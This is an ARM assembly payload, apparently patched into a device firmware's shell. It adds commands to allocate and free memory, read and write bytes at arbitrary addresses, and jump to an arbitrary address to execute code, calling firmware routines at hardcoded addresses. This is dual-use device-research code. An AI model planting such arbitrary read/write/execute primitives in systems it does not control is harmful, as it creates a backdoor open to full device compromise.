_start:
	MOV		R12, SP
	STMFD	SP!, {R5-R11, R12, LR, PC}
	SUB		R11, R12, #4

	MOV		R6, R0
	BL		GrabContext
	MOV		R5, R0
	MOV		r8, #0
	ADD		r1, r5, #0x264
_addr_loop:
	LDRB	R2, [R1, #1]!
	SUB		R2, R2, #0x41	; r2 = r2 - A
	CMP		R2, #0x10		; r2 - 0x10
	LSLLO	R8, R8, #4		; left shift #4 if below 0
	ADDLO	R8, R8, R2		; r8 = r8 + r2 if below 0
	BLO		_addr_loop		; loop again if below 0

	LDRB	R0, [R5, #0x264]
	CMP		R0, #0x61 ; a
	BEQ		cmd_alloc
	CMP		R0, #0x66 ; f
	BEQ		cmd_free
	CMP		R0, #0x77 ; w
	BEQ		cmd_write
	CMP		R0, #0x78 ; x
	BEQ		cmd_execute
	CMP		R0, #0x72 ; r
	BEQ		cmd_read

	MOV		r3, r8
	ADD		r2, r5, #0x264
	ADR		r1, _message
	MOV		r0, r6
	BL		printToShell
return:
	LDMDB	R11, {R5-R11, SP, PC}			; epilogue

cmd_write: ; wADDR CONTENT
	add r1, r5, #0x364

_cmdw_data_loop:
	ldrb r2, [r1], #1
	sub r2, r2, #0x41
	cmp r2, #0x10
	bhs return
	lsl r3, r2, #4

	ldrb r2, [r1], #1
	sub r2, r2, #0x41
	cmp r2, #0x10
	bhs return
	add r3, r3, r2

	push {r0, r1, r2, r3}
	mov r2, r8
	adr r1, _cmdw_addr_fmt
	mov r0, r6
	bl printToShell
	pop {r0, r1, r2, r3}

	strb r3, [r8], #1
	b _cmdw_data_loop

cmd_read:
	add r1, r5, #0x364 ; r1 is reading size value
	LDRB r9, [r1], #1
	mov r2, r8		   ; r2 has start address
_cmdr_data_loop:
	LDRB r8, [r2], #1	; grab from r2, incrementing r2, load into r8 for print
	SUB r9, r9, #1
	cmp r9, #0
	blt return

	push {r0, r1, r2, r3}
	adr r1, _cmdr_addr_fmt
	mov r3, r8
	mov r0, r6
	bl printToShell
	pop {r0, r1, r2, r3}

	b _cmdr_data_loop
cmd_alloc: ; aSIZE
	mov r0, r8
	bl libc_malloc
	mov r2, r0
	adr r1, _cmda_fmt
	mov r0, r6
	bl printToShell
	b return

cmd_free: ; fADDR
	mov r2, r8
	adr r1, _cmdf_fmt
	mov r0, r6
	bl printToShell
	mov r0, r8
	bl libc_free
	b return

cmd_execute: ; xADDR
	mov r1, r5
	mov r0, r6
	blx r8
	b return

GrabContext:
	LDR		R10, GrabContext_fn
	BX		R10
GrabContext_fn:
	.word 0x00021F9C

sprintf:
	LDR		R10, sprintf_fn
	BX		R10
sprintf_fn:
	.word 0x017B407C

printToShell:
	LDR		R10, printToShell_fn
	BX		R10
printToShell_fn:
	.word 0x00012F68

libc_malloc:
	LDR		R10, libc_malloc_fn
	BX		R10
libc_malloc_fn:
	.word 0x017B85E8

libc_free:
	LDR		R10, libc_free_fn
	BX		R10
libc_free_fn:
	.word 0x017B86F4

_message:
	.ascii "arg[1]=%.256s, r8=%#x\r\n\0"

_cmdw_addr_fmt:
	.ascii "%#x <- %#x\r\n\0"
	.align 2

_cmdr_addr_fmt:
	.ascii "%#x : %#x\r\n\0"
	.align 2

_cmda_fmt:
	.ascii "alloc %#x\r\n\0"

_cmdf_fmt:
	.ascii "free %#x\r\n\0"

	.skip 673, 0x0
